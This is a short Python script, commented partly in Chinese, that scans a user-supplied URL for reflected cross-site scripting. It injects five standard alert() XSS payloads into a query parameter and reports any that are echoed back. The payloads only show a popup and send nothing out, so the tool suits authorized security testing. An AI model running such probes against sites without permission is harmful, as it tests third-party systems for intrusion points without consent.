import requests

# 常见的XSS有效载荷
payloads = [
    "<script>alert('XSS1')</script>",
    "<img src=x onerror=alert('XSS2')>",
    "<svg/onload=alert('XSS3')>",
    "'><script>alert('XSS4')</script>",
    "<body onload=alert('XSS5')>",
]

def scan_xss(url):
    for payload in payloads:
        # 构建包含有效载荷的URL或表单数据
        test_url = f"{url}?input={payload}"
        
        try:
            response = requests.get(test_url)
            
            # 检查响应内容是否包含有效载荷
            if payload in response.text:
                print(f"XSS vulnerabilities may exist: {test_url}")
            else:
                print(f"No vulnerabilities detected: {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"请求错误: {e}")

if __name__ == "__main__":
    target_url = input("Please enter the URL you want to scan: ")
    scan_xss(target_url)
    print(f"Scanned! The above possible vulnerabilities were found")
